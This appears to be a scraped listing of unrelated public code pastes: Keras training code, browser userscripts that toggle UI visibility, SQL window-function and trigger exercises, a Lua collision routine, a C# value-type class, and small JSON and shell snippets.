        color_mode='rgb',
        class_mode='categorical',
        batch_size=BATCH_SIZE,
        shuffle=True,
        seed=42,
        subset='training'
    )
    
    print(train_images.class_indices)
    
    val_images = train_data_generator.flow_from_dataframe(
        dataframe=train_df,
        x_col='filepath',
        y_col='label',
        target_size=(TARGET_SIZE, TARGET_SIZE),
        color_mode='rgb',
        class_mode='categorical',
        batch_size=BATCH_SIZE,
        shuffle=True,
        seed=42,
        subset='validation'
    )
    
    print(len(train_images))
    print(len(val_images))
    
    print(f""Тренировка модели: {name}..."")
    history = compile_and_train(model, name, train_images, val_images)
    histories[name] = history
    
    test_data_generator = ImageDataGenerator(
        preprocessing_function=preprocessing_function
    )

    test_images = test_data_generator.flow_from_dataframe(
        dataframe=test_df,
        x_col='filepath',
        y_col='label',
        target_size=(TARGET_SIZE, TARGET_SIZE),
        color_mode='rgb',
        class_mode='categorical',
        batch_size=BATCH_SIZE,
        shuffle=False
    )"
SNMNwrrS,lepota.site and toggles styles,valeraplusplus,JavaScript,Monday 15th of April 2024 06:00:52 AM CDT,"// ==UserScript==
// @name         Shortcut Tracker
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Tracks Ctrl \ key combination on https://app.lepota.site/ and toggles styles
// @author       Your Name
// @match        https://app.lepota.site/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    var ctrlPressed = false;
    var cmdPressed = false;

    // Добавляем стили
    var style = document.createElement('style');
    style.innerHTML = `
    .ant-app.hide_elems aside {
        opacity: 0;
        pointer-events: none;
    }
    .ant-app.hide_elems {
        pointer-events: none;
    }
    .ant-app.hide_elems div[class^=styled__ZoomButtonsWrapper] {
        opacity: 0;
        pointer-events: none;
    }
    .ant-app.hide_elems div[class^=styled__CanvasControlsWrapper]{
        opacity: 0;
        pointer-events: none;
    }
    .ant-app.hide_elems .ant-btn.ant-btn-icon-only {
        opacity: 0;
        pointer-events: none;
    }

    `;
    document.head.appendChild(style);

    document.addEventListener('keydown', function(event) {
        if (event.ctrlKey && event.key === ""\\"") {
            ctrlPressed = true;
        }
        if (event.metaKey && event.key === ""/"") { // Для макбуков Cmd + /
            cmdPressed = true;
        }
    });

    document.addEventListener('keyup', function(event) {
        if( window.location.pathname.match('editor') ){
            if ((ctrlPressed && event.key === ""\\"") || (cmdPressed && event.key === ""/"")) {
                ctrlPressed = false;
                cmdPressed = false;
                toggleStyles();
            }
        }
    });

    function toggleStyles() {
        var layoutContent = document.querySelector('.ant-app');
        if (layoutContent) {
            layoutContent.classList.toggle('hide_elems');
        }
    }
})();"
pqZ0EHxi,data897,TestGuy1,JSON,Monday 15th of April 2024 06:00:14 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'd272f74ae1327ef853437ee2107f288eae51f1c43f7d384202c37c65e43094c5cdaf3d445bdecdb0d926970915fac9078cf9fbda1ca35d29dc4d93e8adff91935e052ab8461d05d85a39bee8ec43abf6ae5180599daede6a442ff09f4c85d058858a885629f83dff35a6ee20e414a5f014300f7932b16fe11fcc3e1f8d1875cd',
  otherdata: [
    'c394392f73277362a5bcf682900b5ec8',
    '9cf2830fd2e932c1e998f6a41761634f',
    'aadd32ba0a692d7c697fbddaaa352a71',
    'db71a52bfc32e4df2d2726146ed7946c',
    'b0dcf8d2378c03df68eb1f54d8c25afb',
    '1c3e04de58e7b43dc132402b200c1eb3',
    '699054fa55a11e7c6308ff01bbbedff8',
    '3ce69526c85f5620c0ce498969eb4d8c'
  ]
}"
jmDi8xag,SQL - Introduction to Window Function - Aggregate Function by HadiMaster,hadimaster65555,PostgreSQL,Monday 15th of April 2024 05:55:06 AM CDT,"-- Create table for salary data
CREATE TABLE salary_data (
    employee_id SERIAL PRIMARY KEY,
    employee_name VARCHAR(100),
    job_title VARCHAR(100),
    salary INTEGER
);

-- Insert sample data into the salary_data table
INSERT INTO salary_data (employee_id, employee_name, job_title, salary) VALUES
(1, 'John Doe', 'Data Scientist', 90000),
(2, 'Jane Smith', 'Data Analyst', 65000),
(3, 'Bob Johnson', 'Machine Learning Engineer', 100000),
(4, 'Sarah Lee', 'Data Engineer', 75000),
(5, 'Michael Brown', 'Data Scientist', 95000),
(6, 'Emily Davis', 'Data Analyst', 60000),
(7, 'Alex Wilson', 'Machine Learning Engineer', 110000),
(8, 'Jessica Clark', 'Data Engineer', 70000),
(9, 'David Rodriguez', 'Data Scientist', 85000),
(10, 'Lisa Martinez', 'Data Analyst', 62000),
(11, 'James Taylor', 'Machine Learning Engineer', 105000),
(12, 'Olivia Anderson', 'Data Engineer', 72000),
(13, 'William Thomas', 'Data Scientist', 92000),
(14, 'Sophia White', 'Data Analyst', 63000),
(15, 'Ethan Hall', 'Machine Learning Engineer', 115000),
(16, 'Mia Moore', 'Data Engineer', 74000),
(17, 'Jacob Garcia', 'Data Scientist', 88000),
(18, 'Ava Martinez', 'Data Analyst', 61000),
(19, 'Benjamin Young', 'Machine Learning Engineer', 120000),
(20, 'Harper Hernandez', 'Data Engineer', 77000),
(21, 'Amelia King', 'Data Scientist', 89000),
(22, 'Ryan Adams', 'Data Analyst', 64000),
(23, 'Zoe Rivera', 'Machine Learning Engineer', 125000),
(24, 'Elijah Long', 'Data Engineer', 78000),
(25, 'Layla Torres', 'Data Scientist', 91000),
(26, 'Jackson Nguyen', 'Data Analyst', 63000),
(27, 'Penelope Scott', 'Machine Learning Engineer', 130000),
(28, 'Chloe Green', 'Data Engineer', 80000),
(29, 'Sebastian Lopez', 'Data Scientist', 93000),
(30, 'Aiden Hill', 'Data Analyst', 65000);

-- check data
SELECT * FROM salary_data

-- average salary for each job title
SELECT
    employee_id,
    employee_name,
    job_title,
    salary,
    AVG(salary) OVER(PARTITION BY job_title) AS avg_salary_per_job
FROM
    salary_data;

-- count of employee for each job title
SELECT
    employee_id,
    employee_name,
    job_title,
    salary,
    COUNT(*) OVER(PARTITION BY job_title) AS num_employees_per_job
FROM
    salary_data;

-- minimum salary for each job title
SELECT
    employee_id,
    employee_name,
    job_title,
    salary,
    MIN(salary) OVER(PARTITION BY job_title) AS min_salary_per_job
FROM
    salary_data;

-- maximum salary for each job title
SELECT
    employee_id,
    employee_name,
    job_title,
    salary,
    MAX(salary) OVER(PARTITION BY job_title) AS min_salary_per_job
FROM
    salary_data;

-- total salary for each job title
SELECT
    employee_id,
    employee_name,
    job_title,
    salary,
    SUM(salary) OVER(PARTITION BY job_title) AS total_salary_per_job
FROM
    salary_data;"
if5b8u03,help,AlewAlow,Lua,Monday 15th of April 2024 05:53:12 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local UserInputService = game:GetService(""UserInputService"")

local Matter = require(ReplicatedStorage.Shared.Libs.Matter)
local Components = require(ReplicatedStorage.Shared.Components)
local Constants = require(ReplicatedStorage.Shared.Constants)

local GetEntityGlobalScale = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalScale)
local GetEntityGlobalPosition = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalPosition)
local GetEntityDescendants = require(ReplicatedStorage.Shared.Utils.GetEntityDescendants)

local function FireShapecast(origin, direction, size, entities, world)
    if type(entities) == ""number"" then
        entities = GetEntityDescendants(entities, world)
	end
	
    local invDirection = 1 / direction

    local closestHit = nil
    local closestTime = math.huge
    local closestNormal = Vector2.new()
    local closestPosition = Vector2.new()

    for _, id in pairs(entities) do
        local transform = world:get(id, Components.Transform)
        if not transform then
            continue
        end

        local collider = world:get(id, Components.Collider)
        if not collider then
            continue
        end

        local globalPosition = GetEntityGlobalPosition(id, world)
        local globalSize = GetEntityGlobalScale(id, world) * collider.Size

        local topleft = globalPosition - globalSize / 2
        local botright = globalPosition + globalSize / 2

        local tEnter = (topleft - origin) * invDirection
        local tExit = (botright - origin) * invDirection

        local tMin = Vector2.new(math.min(tEnter.X, tExit.X), math.min(tEnter.Y, tExit.Y))
        local tMax = Vector2.new(math.max(tEnter.X, tExit.X), math.max(tEnter.Y, tExit.Y))

        if tMax.X >= tMin.Y and tMax.Y >= tMin.X then
            local collisionTime = math.max(tMin.X, tMin.Y)
            local collisionPoint = origin + collisionTime * direction
            local collisionNormal = Vector2.new(
                tMin.X > tMin.Y and -1 or 1,
                tMin.X > tMin.Y and 0 or 1
            )

            if collisionTime < closestTime then
                closestNormal = collisionNormal
                closestPosition = collisionPoint
                closestTime = collisionTime
                closestHit = id
            end
        end
    end

    if closestTime < math.huge then
        return {
            Hit = closestHit,
            Position = closestPosition,
            Normal = closestNormal,
        }
    end

    return false
end



return FireShapecast"
caEhWL3n,Untitled,Pasterbiner123321,PHP,Monday 15th of April 2024 05:40:31 AM CDT,"<div style=""border: 1px solid black; padding: 10px; margin-bottom: 20px;"">
        <h2>Elder Ghastly Dragon Hidden Resp - Sugerowany poziom: 300 lvl 1 rb</h2>
        <a href=""#"" onclick=""window.open('egd.png', 'Elder Ghastly Dragon Hidden Resp Map', 'width=600, height=400'); return false;"">ZOBACZ MAPE!</a>
        <p><font color=""green"">Moby, które spotkasz na drodze: Wszystkie POI mobs, Elder Ghastly Dragon</font></p>
    </div>"
6U4z0nq2,asd,Igor150195,JavaScript,Monday 15th of April 2024 04:37:25 AM CDT,"// ==UserScript==
// @name         Shortcut Tracker
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Tracks Ctrl \ key combination on https://app.lepota.site/ and toggles styles
// @author       Your Name
// @match        https://app.lepota.site/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    var ctrlPressed = false;
    var cmdPressed = false;

    // Добавляем стили
    var style = document.createElement('style');
    style.innerHTML = `
    .ant-layout-content.hide aside {
        opacity: 0;
        pointer-events: none;
    }
    .ant-layout-content.hide {
        pointer-events: none;
    }
    .ant-layout-content.hide div[class^=styled__ZoomButtonsWrapper] {
        opacity: 0;
        pointer-events: none;
    }
    `;
    document.head.appendChild(style);

    document.addEventListener('keydown', function(event) {
        if (event.ctrlKey && event.key === ""\\"") {
            ctrlPressed = true;
        }
        if (event.metaKey && event.key === ""/"") { // Для макбуков Cmd + /
            cmdPressed = true;
        }
    });

    document.addEventListener('keyup', function(event) {
        if( window.location.pathname.match('editor') ){
            if ((ctrlPressed && event.key === ""\\"") || (cmdPressed && event.key === ""/"")) {
                ctrlPressed = false;
                cmdPressed = false;
                toggleStyles();
            }
        }
    });

    function toggleStyles() {
        var layoutContent = document.querySelector('.ant-layout-content');
        if (layoutContent) {
            layoutContent.classList.toggle('hide');
        }
    }
})();
"
0S9C7wkh,test,charis2324,JSON,Monday 15th of April 2024 03:59:28 AM CDT,"{     ""chat-id"": ""test"",     ""created-at"": ""2024-04-15T03:04:24"",     ""creator"": ""Charis"",     ""participants"": [         ""Charis""     ],     ""messages"": [         {             ""created-at"": ""2024-04-15T03:04:24"",             ""author"": ""Charis"",             ""message"": ""Helsdo, World""         }     ],     ""past-chat-content"": null }"
4kyXLQ7E,9 lab,Radoslav_03,MySQL,Monday 15th of April 2024 03:50:51 AM CDT,"-- 1 зад
DELIMITER //
CREATE TRIGGER salarypayments_delete_trigger
AFTER DELETE ON salaryPayments
FOR EACH ROW
BEGIN
    INSERT INTO salarypayments_log (
        operation,
        old_coach_id,
        old_month,
        old_year,
        old_salaryAmount,
        old_dateOfPayment,
        dateOfLog
    )
    VALUES (
        'DELETE',
        OLD.coach_id,
        OLD.month,
        OLD.year,
        OLD.salaryAmount,
        OLD.dateOfPayment,
        NOW()
    );
END;
//
DELIMITER ;


-- 2 зад
DELETE FROM salaryPayments;
INSERT INTO salaryPayments (coach_id, month, year, salaryAmount, dateOfPayment)
SELECT old_coach_id, old_month, old_year, old_salaryAmount, old_dateOfPayment
FROM salarypayments_log
WHERE operation = 'DELETE';


-- 3 зад
DELIMITER //
CREATE TRIGGER before_insert_student_sport_trigger
BEFORE INSERT ON student_sport
FOR EACH ROW
BEGIN
    DECLARE group_count INT;

    SELECT COUNT(*) INTO group_count
    FROM student_sport
    WHERE student_id = NEW.student_id;

    IF group_count >= 2 THEN
        SIGNAL SQLSTATE '45000'
        SET MESSAGE_TEXT = 'Ученикът вече участва в две групи. Не може да бъде добавен в още една група.';
    END IF;
END;
//
DELIMITER ;


-- 4 зад
CREATE VIEW students_info AS
SELECT s.name AS student_name, COUNT(ss.student_id) AS group_count
FROM students s
JOIN student_sport ss ON s.id = ss.student_id
GROUP BY s.id;
SELECT * FROM students_info;


-- 5 зад
DELIMITER //
CREATE PROCEDURE GetStudentsByCoachName(IN coachName VARCHAR(255))
BEGIN
    SELECT st.name AS student_name, sg.id AS group_id, sp.name AS sport_name
    FROM students st
    JOIN student_sport ss ON st.id = ss.student_id
    JOIN sportGroups sg ON ss.sportGroup_id = sg.id
    JOIN sports sp ON sg.sport_id = sp.id
    JOIN coaches c ON sg.coach_id = c.id
    WHERE c.name = coachName;
END//
DELIMITER ;
CALL GetStudentsByCoachName(""Ivan Todorov Petkov"");


-- 6 зад
DELIMITER //
CREATE PROCEDURE GetCoachesBySportName(IN sportName VARCHAR(255))
BEGIN
    SELECT c.name AS coach_name, sg.location, sg.hourOfTraining, sg.dayOfWeek
    FROM sportGroups sg
    JOIN coaches c ON sg.coach_id = c.id
    JOIN sports s ON sg.sport_id = s.id
    WHERE s.name = sportName;
END//
DELIMITER ;
CALL GetCoachesBySportName(""Football"");"
xSk63NVF,bash-225671,sleekkeepup,Bash,Monday 15th of April 2024 03:33:06 AM CDT,tr -dc 0-9abcdefghijkmnopqrstuvwxyz < /dev/urandom | head -c 26 ; echo
qCcAQz10,DDD.ValueType,VssA,C#,Monday 15th of April 2024 02:31:02 AM CDT,"using Ddd.Taxi.Domain;
using System.Reflection;
using System.Text;
using System.Collections.Generic;
using System.Linq;

namespace Ddd.Infrastructure
{
    public class ValueType<T>
    {
        private readonly List<PropertyInfo> propertyInfos;

        public ValueType()
        {
            propertyInfos = GetType()
                .GetProperties(BindingFlags.Instance | BindingFlags.Public)
                .OrderBy(property => property.Name)
                .ToList();
        }

        public override int GetHashCode()
        {
            unchecked
            {
                int hash = 0;
                foreach (var property in propertyInfos)
                {
                    var propertyValue = property.GetValue(this, null);
                    var propertyHash = propertyValue != null ? propertyValue.GetHashCode() : 0;
                    hash = (hash * 1244324135) ^ propertyHash;
                }
                return hash;
            }
        }

        public override bool Equals(object obj)
        {
            if (obj is null)
                return false;

            if (obj is not ValueType<T> otherValue)
                return false;

                

            foreach (var property in propertyInfos)
            {
                if (property.GetValue(this) == null && property.GetValue(otherValue) == null)
                    continue;

                if (!(property.GetValue(this) == null || property.GetValue(otherValue) == null || !property.GetValue(this)
                                                                                                        .Equals(property.GetValue(otherValue))))
                    continue;
                return false;
            }
            return true;
        }

        public bool Equals(PersonName name) => Equals((object)name);

        public override string ToString()
        {
            var result = new StringBuilder(GetType().Name + ""("");
            for (int index = 0; index < propertyInfos.Count; index++)
            {
                var property = propertyInfos[index];
                var propertyValue = property.GetValue(this, null);
                result.AppendFormat(""{0}: {1}{2}"", property.Name, propertyValue, index != propertyInfos.Count - 1 ? ""; "" : "")"");
            }
            return result.ToString();
        }
    }
}"
